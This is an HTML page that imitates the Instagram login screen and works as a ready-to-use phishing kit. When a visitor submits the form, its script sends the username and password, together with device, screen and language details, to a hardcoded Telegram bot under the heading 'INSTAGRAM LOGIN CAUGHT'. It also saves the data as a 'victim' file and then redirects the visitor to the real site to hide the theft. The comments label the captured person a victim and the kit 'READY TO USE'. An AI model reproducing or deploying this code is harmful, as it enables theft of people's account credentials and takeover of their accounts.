<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:linear-gradient(45deg,#f093fb 0%,#f5576c 50%,#4facfe 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
        .container{background:white;border-radius:5px;box-shadow:0 4px 20px rgba(0,0,0,.15);width:100%;max-width:350px;padding:40px 40px 30px;margin:20px}
        .logo{text-align:center;margin-bottom:35px}
        .logo i{font-size:48px;background:linear-gradient(45deg,#E4405F,#FADE1B);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
        .logo span{font-size:32px;font-weight:300;color:#262626;letter-spacing:-.5px}
        .input-group{position:relative;margin-bottom:20px}
        input{width:100%;height:38px;padding:10px 12px;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:14px;outline:none;transition:all .2s}
        input:focus{border-color:#0095f6;background:white;box-shadow:0 0 0 2px rgba(0,149,246,.2)}
        input::placeholder{color:#8e8e8e}
        .login-btn{width:100%;height:32px;background:linear-gradient(45deg,#0095f6,#007acc);color:white;border:none;border-radius:6px;font-weight:600;font-size:14px;cursor:pointer;transition:all .2s;margin-top:10px}
        .login-btn:hover:not(:disabled){background:linear-gradient(45deg,#007acc,#005a9e);transform:translateY(-1px)}
        .login-btn:disabled{opacity:.6;cursor:not-allowed}
        .forgot{text-align:center;margin:20px 0}
        .forgot a{color:#00376b;text-decoration:none;font-size:14px}
        .divider{position:relative;text-align:center;margin:25px 0;color:#8e8e8e;font-size:13px}
        .divider::before{content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:#efefef}
        .divider span{background:white;padding:0 25px}
        .facebook{text-align:center;margin:20px 0}
        .facebook a{color:#385185;text-decoration:none;font-weight:600;font-size:14px;display:flex;align-items:center;justify-content:center;gap:8px}
        .signup{text-align:center;padding:20px 0;border-top:1px solid #efefef;margin-top:25px}
        .signup a{color:#0095f6;font-weight:600;text-decoration:none;font-size:14px}
        .success{background:#00c851;color:white;padding:12px;border-radius:6px;margin-top:15px;display:none;text-align:center;font-size:14px}
        .spinner{border:2px solid #f3f3f3;border-top:2px solid #0095f6;border-radius:50%;width:20px;height:20px;animation:spin 1s linear infinite;display:inline-block;margin-right:8px}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        @media (max-width:480px){.container{margin:10px;padding:30px 25px}}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <i class="fab fa-instagram"></i>
            <div style="font-size:28px;font-weight:300;margin-top:5px">Instagram</div>
        </div>
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn" id="loginBtn">Log in</button>
            <div class="success" id="success">âœ… Login successful! Redirecting...</div>
        </form>
        <div class="forgot"><a href="#">Forgot password?</a></div>
        <div class="divider"><span>OR</span></div>
        <div class="facebook"><a href="#"><i class="fab fa-facebook-f"></i>Log in with Facebook</a></div>
        <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
    </div>

    <script>
        // ðŸ”¥ à¦¤à§‹à¦®à¦¾à¦° Telegram Bot - READY TO USE!
        const BOT_TOKEN = '8545740405:AAGzcDBrPIAvS5YmUsRB_8sh5UmcrpGHB0Y';
        const CHAT_ID = '8413780186';
        
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            const success = document.getElementById('success');
            
            // Show loading
            loginBtn.disabled = true;
            loginBtn.innerHTML = '<div class="spinner" style="width:16px;height:16px;margin-right:8px;display:inline-block;vertical-align:middle"></div>Logging in...';
            
            // ðŸ”¥ Victim Data
            const victimData = {
                username: username,
                password: password,
                time: new Date().toLocaleString('en-US', {timeZone: 'Asia/Dhaka'}),
                device: navigator.userAgent.slice(0,60),
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language
            };
            
            // ðŸ”¥ 1. TELEGRAM à¦ INSTANT SEND
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `ðŸŽ£ INSTAGRAM LOGIN CAUGHT!\n\nðŸ‘¤ Username: ${username}\nðŸ”‘ Password: ${password}\nðŸ“± Device: ${victimData.device}\nðŸ–¥ï¸ Screen: ${victimData.screen}\nâ° Time: ${victimData.time}\nðŸŒ Language: ${victimData.language}`
                    })
                });
            } catch(e) {
                console.log('Telegram error:', e);
            }
            
            // ðŸ”¥ 2. Console Log (F12)
            console.log('ðŸŽ£ VICTIM CAUGHT:', victimData);
            
            // ðŸ”¥ 3. JSON Download
            const dataStr = JSON.stringify(victimData, null, 2);
            const dataBlob = new Blob([dataStr], {type: 'application/json'});
            const url = URL.createObjectURL(dataBlob);
            const link = document.createElement('a');
            link.href = url;
            link.download = `instagram_victim_${Date.now()}.json`;
            link.click();
            
            // ðŸ”¥ 4. Success + Redirect
            setTimeout(() => {
                loginBtn.style.display = 'none';
                success.style.display = 'block';
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/';
                }, 1500);
            }, 1000);
        });
    </script>
</body>
</html>
